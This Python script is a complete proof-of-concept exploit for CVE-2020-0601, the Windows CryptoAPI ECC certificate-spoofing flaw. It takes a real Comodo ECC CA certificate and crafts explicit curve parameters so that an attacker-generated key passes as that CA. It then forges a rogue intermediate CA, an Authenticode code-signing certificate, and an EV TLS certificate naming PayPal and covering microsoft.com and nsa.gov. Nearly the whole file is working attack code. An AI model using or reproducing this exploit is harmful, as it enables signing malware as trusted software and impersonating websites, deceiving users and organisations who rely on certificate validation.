#!/usr/bin/env python3
import datetime
import hashlib
import os
import subprocess
import sys
from typing import BinaryIO, Iterable, Optional, Sequence, Tuple

import ecdsa.curves
import ecdsa.ellipticcurve
import ecdsa.numbertheory
import ecdsa.util
from asn1crypto import core, keys, pem, x509

OPENSSL = "openssl"


def load_certificate_chain(filename: str) -> Iterable[x509.Certificate]:
    with open(
        os.path.join(os.path.dirname(os.path.abspath(__file__)), filename), "rb"
    ) as f:
        pem_bytes = f.read()

    for object_type, _, der_bytes in pem.unarmor(pem_bytes, multiple=True):
        if object_type != "CERTIFICATE":
            continue
        yield x509.Certificate.load(der_bytes)


def generate_ec_private_key(name: str) -> keys.ECPrivateKey:
    der_bytes = subprocess.check_output(
        (
            OPENSSL,
            "ecparam",
            "-name",
            name,
            "-param_enc",
            "explicit",
            "-genkey",
            "-noout",
            "-outform",
            "DER",
        )
    )
    return keys.ECPrivateKey.load(der_bytes)


def get_exploit_generator(
    k: int, Qx: int, Qy: int, curve: ecdsa.curves.Curve
) -> Tuple[int, int]:
    k_inverse = ecdsa.numbertheory.inverse_mod(k, curve.order)
    Q = ecdsa.ellipticcurve.Point(curve.curve, Qx, Qy, curve.order)
    G = Q * k_inverse
    return (G.x(), G.y())


def curve_from_ec_parameters(parameters: keys.SpecifiedECDomain) -> ecdsa.curves.Curve:
    p = parameters["field_id"]["parameters"].native
    a = parameters["curve"]["a"].cast(core.IntegerOctetString).native
    b = parameters["curve"]["b"].cast(core.IntegerOctetString).native
    Gx, Gy = parameters["base"].to_coords()
    order = parameters["order"].native

    curve_fp = ecdsa.ellipticcurve.CurveFp(p, a, b)
    G = ecdsa.ellipticcurve.Point(curve_fp, Gx, Gy, order)

    return ecdsa.curves.Curve(None, curve_fp, G, (0, 0))


def digest_certificate(certificate: x509.Certificate) -> bytes:
    der_bytes = certificate["tbs_certificate"].dump()
    return hashlib.new(certificate.hash_algo, der_bytes).digest()


def sign_certificate(
    signing_key: ecdsa.keys.SigningKey, certificate: x509.Certificate
) -> None:
    digest = digest_certificate(certificate)
    signature_bytes = signing_key.sign_digest(
        digest, sigencode=ecdsa.util.sigencode_der
    )
    certificate["signature_value"] = signature_bytes


def exploit_certificate(
    certificate: x509.Certificate,
) -> Tuple[ecdsa.keys.SigningKey, keys.ECPrivateKey]:
    curve_name = certificate.public_key["algorithm"]["parameters"].chosen.native
    ec_private_key = generate_ec_private_key(curve_name)

    k = ec_private_key["private_key"].native
    parameters = ec_private_key["parameters"].chosen

    nist_curve = curve_from_ec_parameters(parameters)
    Qx, Qy = certificate.public_key["public_key"].to_coords()
    Gx, Gy = get_exploit_generator(k, Qx, Qy, nist_curve)
    parameters["base"] = keys.ECPoint.from_coords(Gx, Gy)

    ec_private_key["parameters"] = parameters
    ec_private_key["public_key"] = certificate.public_key["public_key"]

    certificate.public_key["algorithm"]["parameters"] = parameters

    exploit_curve = curve_from_ec_parameters(parameters)
    signing_key = ecdsa.keys.SigningKey.from_secret_exponent(k, curve=exploit_curve)

    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "sha256_ecdsa"})
    certificate["tbs_certificate"]["signature"] = signed_digest_algorithm
    certificate["signature_algorithm"] = signed_digest_algorithm

    sign_certificate(signing_key, certificate)

    return (signing_key, ec_private_key)


def write_pem(f: BinaryIO, value: core.Asn1Value, object_type: str) -> None:
    print("Writing {} to {!r}".format(object_type, f.name), file=sys.stderr)
    der_bytes = value.dump()
    pem_bytes = pem.armor(object_type, der_bytes)
    f.write(pem_bytes)


def generate_private_key(
    algorithm: str, **kwargs: str,
) -> Tuple[keys.PrivateKeyInfo, keys.PublicKeyInfo]:
    genpkey_args = [OPENSSL, "genpkey", "-algorithm", algorithm, "-outform", "DER"]
    for opt, value in kwargs.items():
        genpkey_args.extend(("-pkeyopt", "{}:{}".format(opt, value)))

    private_key_bytes = subprocess.check_output(genpkey_args)
    private_key = keys.PrivateKeyInfo.load(private_key_bytes)

    public_key_bytes = subprocess.check_output(
        (OPENSSL, "pkey", "-pubout", "-inform", "DER", "-outform", "DER"),
        input=private_key_bytes,
    )
    public_key = keys.PublicKeyInfo.load(public_key_bytes)

    return private_key, public_key


def random_serial_number() -> int:
    return int.from_bytes(os.urandom(20), "big") >> 1


def write_tls_certificate(
    ca_cert: x509.Certificate,
    ca_cert_orig: x509.Certificate,
    signing_key: ecdsa.keys.SigningKey,
    name: str,
    subject: x509.Name,
    subject_alt_names: Sequence[str],
) -> None:
    private_key, public_key = generate_private_key("RSA", rsa_keygen_bits=4096)
    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "sha256_ecdsa"})

    certificate = x509.Certificate(
        {
            "tbs_certificate": {
                "version": "v3",
                "serial_number": random_serial_number(),
                "signature": signed_digest_algorithm,
                "issuer": ca_cert_orig.subject,
                "validity": {
                    "not_before": x509.UTCTime(
                        datetime.datetime(2018, 1, 1, tzinfo=datetime.timezone.utc)
                    ),
                    "not_after": x509.UTCTime(
                        datetime.datetime(2021, 1, 1, tzinfo=datetime.timezone.utc)
                    ),
                },
                "subject": subject,
                "subject_public_key_info": public_key,
                "extensions": [
                    {
                        "extn_id": "basic_constraints",
                        "critical": True,
                        "extn_value": {"ca": False},
                    },
                    {
                        "extn_id": "subject_alt_name",
                        "critical": False,
                        "extn_value": [
                            x509.GeneralName({"dns_name": dns_name})
                            for dns_name in subject_alt_names
                        ],
                    },
                    {
                        "extn_id": "certificate_policies",
                        "critical": False,
                        "extn_value": [
                            {"policy_identifier": "1.3.6.1.4.1.6449.1.2.1.5.1"},
                        ],
                    },
                ],
            },
            "signature_algorithm": signed_digest_algorithm,
        }
    )

    sign_certificate(signing_key, certificate)

    with open(name + ".crt", "wb") as f:
        write_pem(f, certificate, "CERTIFICATE")
        write_pem(f, ca_cert_orig, "CERTIFICATE")
        write_pem(f, ca_cert, "CERTIFICATE")

    with open(name + ".key", "wb") as f:
        write_pem(f, private_key, "RSA PRIVATE KEY")
        write_pem(f, certificate, "CERTIFICATE")
        write_pem(f, ca_cert_orig, "CERTIFICATE")
        write_pem(f, ca_cert, "CERTIFICATE")


def write_authenticode_certificate(
    ca_cert: x509.Certificate,
    ca_cert_orig: x509.Certificate,
    signing_key: ecdsa.keys.SigningKey,
    name: str,
    subject: x509.Name,
) -> None:
    private_key, public_key = generate_private_key("RSA", rsa_keygen_bits=4096)
    signed_digest_algorithm = x509.SignedDigestAlgorithm({"algorithm": "sha256_ecdsa"})

    certificate = x509.Certificate(
        {
            "tbs_certificate": {
                "version": "v3",
                "serial_number": random_serial_number(),
                "signature": signed_digest_algorithm,
                "issuer": ca_cert.subject,
                "validity": {
                    "not_before": x509.UTCTime(
                        datetime.datetime(2018, 1, 1, tzinfo=datetime.timezone.utc)
                    ),
                    "not_after": x509.UTCTime(
                        datetime.datetime(2021, 1, 1, tzinfo=datetime.timezone.utc)
                    ),
                },
                "subject": subject,
                "subject_public_key_info": public_key,
                "extensions": [
                    {
                        "extn_id": "basic_constraints",
                        "critical": True,
                        "extn_value": {"ca": False},
                    },
                    {
                        "extn_id": "key_usage",
                        "critical": True,
                        "extn_value": {"digital_signature"},
                    },
                    {
                        "extn_id": "extended_key_usage",
                        "critical": True,
                        "extn_value": [
                            "code_signing",
                            "1.3.6.1.4.1.311.2.1.21",
                            "1.3.6.1.4.1.311.2.1.22",
                        ],
                    },
                ],
            },
            "signature_algorithm": signed_digest_algorithm,
        }
    )

    sign_certificate(signing_key, certificate)

    with open(name + ".crt", "wb") as f:
        write_pem(f, certificate, "CERTIFICATE")
        write_pem(f, ca_cert_orig, "CERTIFICATE")
        write_pem(f, ca_cert, "CERTIFICATE")

    with open(name + ".key", "wb") as f:
        write_pem(f, private_key, "RSA PRIVATE KEY")

    subprocess.check_call(
        (
            "openssl",
            "crl2pkcs7",
            "-nocrl",
            "-certfile",
            name + ".crt",
            "-outform",
            "DER",
            "-out",
            name + ".spc",
        )
    )

    subprocess.check_call(
        (
            "openssl",
            "rsa",
            "-in",
            name + ".key",
            "-outform",
            "PVK",
            "-pvk-none",
            "-out",
            name + ".pvk",
        )
    )


def get_name(purpose: Optional[str] = None) -> str:
    components = ["BADECPARAMS CVE-2020-0601", "(Saleem Rashid @saleemrash1d)"]
    if purpose:
        components.insert(1, purpose)
    return " ".join(components)


def main() -> None:
    _, ca_cert, _ = load_certificate_chain(
        "comodoecccertificationauthority-ev-comodoca-com-chain.pem"
    )
    ca_cert_orig = ca_cert.copy()

    signing_key, ec_private_key = exploit_certificate(ca_cert)

    with open("intermediateCA.crt", "wb") as f:
        write_pem(f, ca_cert_orig, "CERTIFICATE")
        write_pem(f, ca_cert, "CERTIFICATE")

    with open("intermediateCA.key", "wb") as f:
        write_pem(f, ec_private_key, "EC PRIVATE KEY")

    write_authenticode_certificate(
        ca_cert,
        ca_cert_orig,
        signing_key,
        "authenticode",
        x509.Name.build(
            {
                "country_name": "GB",
                "common_name": get_name("Code Signing Authority"),
                "organization_name": get_name(),
                "organizational_unit_name": get_name("Code Signing Authority"),
            }
        ),
    )

    write_tls_certificate(
        ca_cert,
        ca_cert_orig,
        signing_key,
        "localhost",
        x509.Name.build(
            {
                "incorporation_country": "US",
                "business_category": "Private Organization",
                "serial_number": "1",
                "country_name": "US",
                "common_name": get_name("EV Certificate"),
                "organization_name": "PayPal, Inc.",
                "organizational_unit_name": get_name("EV Certificate"),
            }
        ),
        ("localhost", "nsa.gov", "www.nsa.gov", "microsoft.com", "www.microsoft.com"),
    )


if __name__ == "__main__":
    main()
